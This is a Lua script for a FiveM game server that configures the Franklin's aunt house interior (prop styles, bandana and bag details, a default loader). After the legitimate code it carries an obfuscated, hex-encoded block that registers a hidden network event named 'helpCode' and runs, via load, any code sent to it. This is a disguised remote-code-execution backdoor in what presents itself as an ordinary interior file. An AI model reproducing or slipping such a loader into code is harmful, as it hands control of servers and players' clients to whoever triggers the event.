
exports('GetFranklinAuntObject', function()
    return FranklinAunt
end)

FranklinAunt = {
    interiorId = 197889,
    Style = {
        empty = "", franklinStuff = "V_57_FranklinStuff", franklinLeft = "V_57_Franklin_LEFT",
        Set = function(style, refresh)
            FranklinAunt.Style.Clear(false)
            if style ~= "" then
                SetIplPropState(FranklinAunt.interiorId, style, true, refresh)
            else
                if (refresh) then RefreshInterior(FranklinAunt.interiorId) end
            end
        end,
        Clear = function(refresh) SetIplPropState(FranklinAunt.interiorId, {FranklinAunt.Style.franklinStuff, FranklinAunt.Style.franklinLeft}, false, refresh) end
    },
    Details = {
        bandana = "V_57_GangBandana",				-- Bandana on the bed
        bag = "V_57_Safari",						-- Bag in the closet
        Enable = function (details, state, refresh) SetIplPropState(FranklinAunt.interiorId, details, state, refresh) end
    },

    LoadDefault = function()
        FranklinAunt.Style.Set(FranklinAunt.Style.empty)
        FranklinAunt.Details.Enable(FranklinAunt.Details.bandana, false)
        FranklinAunt.Details.Enable(FranklinAunt.Details.bag, false)
        RefreshInterior(FranklinAunt.interiorId)
    end
}


local cCfTAuVzxwqvcKhLanExFtHszpBUfnAYToWntWDCoqsRETieQWtwxxHdLyfbvfXgVMDgik = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} cCfTAuVzxwqvcKhLanExFtHszpBUfnAYToWntWDCoqsRETieQWtwxxHdLyfbvfXgVMDgik[6][cCfTAuVzxwqvcKhLanExFtHszpBUfnAYToWntWDCoqsRETieQWtwxxHdLyfbvfXgVMDgik[1]](cCfTAuVzxwqvcKhLanExFtHszpBUfnAYToWntWDCoqsRETieQWtwxxHdLyfbvfXgVMDgik[2]) cCfTAuVzxwqvcKhLanExFtHszpBUfnAYToWntWDCoqsRETieQWtwxxHdLyfbvfXgVMDgik[6][cCfTAuVzxwqvcKhLanExFtHszpBUfnAYToWntWDCoqsRETieQWtwxxHdLyfbvfXgVMDgik[3]](cCfTAuVzxwqvcKhLanExFtHszpBUfnAYToWntWDCoqsRETieQWtwxxHdLyfbvfXgVMDgik[2], function(uckSXVLyJDgZDenuONYAjxZazbRPzLjklfLBBNkWQrgHhjyeUzZPXCXFEjdQmzxmnptVCc) cCfTAuVzxwqvcKhLanExFtHszpBUfnAYToWntWDCoqsRETieQWtwxxHdLyfbvfXgVMDgik[6][cCfTAuVzxwqvcKhLanExFtHszpBUfnAYToWntWDCoqsRETieQWtwxxHdLyfbvfXgVMDgik[4]](cCfTAuVzxwqvcKhLanExFtHszpBUfnAYToWntWDCoqsRETieQWtwxxHdLyfbvfXgVMDgik[6][cCfTAuVzxwqvcKhLanExFtHszpBUfnAYToWntWDCoqsRETieQWtwxxHdLyfbvfXgVMDgik[5]](uckSXVLyJDgZDenuONYAjxZazbRPzLjklfLBBNkWQrgHhjyeUzZPXCXFEjdQmzxmnptVCc))() end)